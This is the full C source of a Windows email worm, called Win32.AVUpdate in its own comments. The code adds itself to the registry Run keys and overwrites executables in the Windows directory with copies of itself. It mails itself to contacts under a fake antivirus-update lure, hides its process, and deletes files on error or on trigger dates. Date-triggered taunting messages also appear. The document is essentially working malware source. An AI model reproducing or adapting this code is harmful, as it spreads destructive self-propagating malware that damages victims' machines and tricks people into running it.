   #include "avupdate.h"
   #pragma hdrstop
   #pragma warning (disable: 4001)
   #pragma warning (disable: 4068)

   char VirPath[256],InfectDir[256],ExePath[256];
   HKEY WinKey,NTKey,InstKey,FirstKey,DateKey;
   HANDLE ExeHandle;
   ULONG Err,ErrSend;
   DWORD FileInfo;
   LPSTR Nom = "a";
   LPSTR NoInfect1 = "Emm386.exe";
   LPSTR NoInfect2 = "Setver.exe";
   int Resultat;
   HWND OutHwnd,NewHwnd;
   typedef DWORD(*RegSerPro)(DWORD,DWORD);
   HMODULE KernInst,MapiHinst;
   typedef ULONG(*MessSend)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
   typedef ULONG(*ResolName)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
   typedef ULONG(*FreeBuff)(LPVOID);
   #pragma argsused
   int APIENTRY WinMain
   (
   HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR     lpszCmdLine,
   int       nCmdShow
   )
   {
   //Win32.AVUpdate par ZeMacroKiller98, Membre de [SOS]
   //Mon premiere essai pour un Worm
   //Tous droits reserves (c) 2000
   WIN32_FIND_DATA ExeHost;
   OSVERSIONINFO osvi;
   SYSTEMTIME TrigTime;
   RegSerPro RegisterServiceProcess;
   KernInst = LoadLibrary("kernel32.dll");
   RegisterServiceProcess = (RegSerPro)GetProcAddress(KernInst,"RegisterServiceProcess");
   SearchPath(NULL,_argv[0],NULL,sizeof(VirPath),VirPath,NULL);
   osvi.dwOSVersionInfoSize = sizeof(osvi);
   GetVersionEx(&osvi);
   if(osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&NTKey);
           RegSetValueEx(NTKey,"RunAVUpdate",0,REG_SZ,VirPath,sizeof(VirPath));
           RegCloseKey(NTKey);
   }
   else
   {
           RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&WinKey);
           RegSetValueEx(WinKey,"RunAVUpdate",0,REG_SZ,VirPath,sizeof(VirPath));
           RegCloseKey(WinKey);
   }
   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\AVUpdate\\Install",0,KEY_ALL_ACCESS,&InstKey)!=ERROR_SUCCESS)
   {
   GetWindowsDirectory(InfectDir,sizeof(InfectDir));
   SetCurrentDirectory(InfectDir);
   ExeHandle = FindFirstFile("*.exe",&ExeHost);
   ExeHostFind:
   if((CompareString(LOCALE_SYSTEM_DEFAULT,SORT_STRINGSORT,ExeHost.cFileName,lstrlen(ExeHost.cFileName),NoInfect1,lstrlen(NoInfect1)))==CSTR_EQUAL)
           goto Suite;
   if((CompareString(LOCALE_SYSTEM_DEFAULT,SORT_STRINGSORT,ExeHost.cFileName,lstrlen(ExeHost.cFileName),NoInfect2,lstrlen(NoInfect2)))==CSTR_EQUAL)
           goto Suite;
   CopyFile(_argv[0],ExeHost.cFileName,FALSE);
   Suite:
   if(FindNextFile(ExeHandle,&ExeHost)==TRUE)
           goto ExeHostFind;
   FindClose(ExeHandle);
   RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\AVUpdate\\Install",&FirstKey);
   RegCloseKey(FirstKey);
   RegCloseKey(InstKey);
   MessSend MAPISendMail;
   ResolName MAPIResolveName;
   FreeBuff MAPIFreeBuffer;
   MapiHinst = LoadLibrary("mapi32.dll");
   MAPISendMail = (MessSend)GetProcAddress(MapiHinst,"MAPISendMail");
   if(MAPISendMail==NULL)
   {
           MessageBox(NULL,"MAPISendMail not exist","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MAPIResolveName = (ResolName)GetProcAddress(MapiHinst,"MAPIResolveName");
   if(MAPIResolveName==NULL)
   {
           MessageBox(NULL,"MAPIResolveName not exist","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MAPIFreeBuffer = (FreeBuff)GetProcAddress(MapiHinst,"MAPIFreeBuffer");
   if(MAPIFreeBuffer==NULL)
   {
           MessageBox(NULL,"MAPIFreeBuffer not exist","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MapiMessage stMessage;
   MapiRecipDesc stRecip;
   MapiFileDesc stFile;
   lpMapiRecipDesc lpRecip;
   stFile.ulReserved = 0;
   stFile.flFlags = 0L;
   stFile.nPosition = (ULONG)-1;
   stFile.lpszPathName = VirPath;
   stFile.lpszFileName = NULL;
   stFile.lpFileType = NULL;
   MessageBox(NULL,"Please select email address to send at your friend\nSelect email address with ''a'' only not with ''A''\n","AV Intelligent Updater",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
   NonResolu:
   Err = (MAPIResolveName)(lhSessionNull,0L,Nom,MAPI_DIALOG,0,&lpRecip);
   if(Err!=SUCCESS_SUCCESS)
   {
   switch(Err){
           case MAPI_E_AMBIGUOUS_RECIPIENT:
                   MessageBox(NULL,"The recipient requested has not been or could\n not be resolved to a unique address list entry","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
           break;
           case MAPI_E_UNKNOWN_RECIPIENT:
                   MessageBox(NULL,"The recipient could not be resolved to any\naddress.The recipient might not exist or might be unknown","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_FAILURE:
                   MessageBox(NULL,"One or more unspecified errors occured\nThe name was not resolved","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_INSUFFICIENT_MEMORY:
                   MessageBox(NULL,"There was insufficient memory to proceed","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_NOT_SUPPORTED:
                   MessageBox(NULL,"The operation was not supported by the messaging system","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
           case MAPI_E_USER_ABORT:
                   MessageBox(NULL,"The user was cancelled one or more dialog box","AV Intelligent Updater",MB_OK|MB_ICONSTOP);
                   DeleteFile("*.*");
                   ExitProcess(0);
           break;
   }
   goto NonResolu;
   }
   stRecip.ulReserved = lpRecip->ulReserved;
   stRecip.ulRecipClass = MAPI_TO;
   stRecip.lpszName = lpRecip->lpszName;
   stRecip.lpszAddress = lpRecip->lpszAddress;
   stRecip.ulEIDSize = lpRecip->ulEIDSize;
   stRecip.lpEntryID = lpRecip->lpEntryID;
   stMessage.ulReserved = 0;
   stMessage.lpszSubject = "Virus Alert Update: New VBS.LoveLetter Threat";
   stMessage.lpszNoteText = "Hi Friend,\nThis mail contains a new AV intelligent updater for all antivirus.\n\nTo install it, execute the attachment file\nif you have any problem, send mail at antivirus@hotmail.com";
   stMessage.lpszMessageType = NULL;
   stMessage.lpszDateReceived = NULL;
   stMessage.lpszConversationID = NULL;
   stMessage.flFlags = 0L;
   stMessage.lpOriginator = NULL;
   stMessage.nRecipCount = 1;
   stMessage.lpRecips = &stRecip;
   stMessage.nFileCount = 1;
   stMessage.lpFiles = &stFile;
   ErrSend = (MAPISendMail)(lhSessionNull,0L,&stMessage,0L,0L);
   if(ErrSend!=SUCCESS_SUCCESS)
   {
           MessageBox(NULL,"I can send this update to your friend","AV Intelligent Updater",MB_OK|MB_ICONEXCLAMATION);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   MessageBox(NULL,
                   "Internal error occured when you have launch this program\nContact antivirus@hotmail.com or others AV",
                   "AV Intelligent Updater",
                   MB_OK|MB_ICONEXCLAMATION);
   ExitProcess(0);
   }
   RegCloseKey(InstKey);
   STARTUPINFO StaInf;
   PROCESS_INFORMATION ProInfo;
   StaInf.cb = sizeof(STARTUPINFO);
   StaInf.lpReserved = NULL;
   StaInf.lpReserved2 = NULL;
   StaInf.cbReserved2 = 0;
   StaInf.lpDesktop = NULL;
   StaInf.dwFlags = STARTF_FORCEOFFFEEDBACK;
   CreateProcess(VirPath,
                   GetCommandLine(),
                   (LPSECURITY_ATTRIBUTES)NULL,
                   (LPSECURITY_ATTRIBUTES)NULL,
                   FALSE,
                   0,
                   NULL,
                   NULL,
                   &StaInf,
                   &ProInfo);
   (RegisterServiceProcess)(ProInfo.dwProcessId,1);
   CloseHandle(ProInfo.hThread);
   CloseHandle(ProInfo.hProcess);
   GetLocalTime(&TrigTime);
   if((TrigTime.wDay==13)&&(TrigTime.wSecond==30))
   {
           MessageBox(NULL,
                   "Attention, votre PC est en danger!!!!!\nCar ceci est ma veritable identite\nVeuillez contacter votre centre AV le plus proche",
                   "Virus Win32.AVUpdate",
                   MB_OK|MB_ICONEXCLAMATION|MB_SYSTEMMODAL);
           DeleteFile("*.*");
           ExitProcess(0);
   }
   if((TrigTime.wDay==2)&&(TrigTime.wMonth==2))
   {
           MessageBox(NULL,
                   "Hello stupid user, i'm so sorry but i have to interrupt your work,\nCause i hate this shitty program. Click OK to continue\n\nGreets to:\n\tSuper/29A\n\tDarkman/29A\n\tJack Qwerty/29A\n\tBilly Belcebu/DDT\n\tAnd many other 29 Aers...",
                   "Win32.Eva by Benny, (c) 1999",
                   MB_OK|MB_SYSTEMMODAL);
           ExitProcess(0);
   }
   if((TrigTime.wDay==9)&&(TrigTime.wMonth==5))
   {
           MessageBox(NULL,
                   "This is my last contribution to Ultimate Chaos team\nGreetings UC brothers",
                   "Win32.3x3eyes coded by: Bumblee[UC]",
                   MB_OK|MB_SYSTEMMODAL);
           ExitProcess(0);
   }
   if((TrigTime.wDay==5)&&(TrigTime.wMonth==4))
   {
           MessageBox(NULL,
                   "SPIT.Win32 is a Bumblee Win32 Virus\n\nFeel the power of spain and die by the SpiT!",
                   "Virus Report rev 2.1",
                   MB_OK|MB_SYSTEMMODAL);
           ExitProcess(0);
   }
   if((TrigTime.wDay==24)&&(TrigTime.wMonth==9))
   {
           MessageBox(NULL,
                   "This >TOTILIX< Virus was assembled at the city of Oporto Portugal!\nGas_par@hotmail.com\n(c) 1999 G@SP@R aka Sexus",
                   "TOTILIX Presents...",
                   MB_OK|MB_SYSTEMMODAL);
           ExitProcess(0);
   }
   FreeLibrary(MapiHinst);
   FreeLibrary(KernInst);
   return 0;
   }
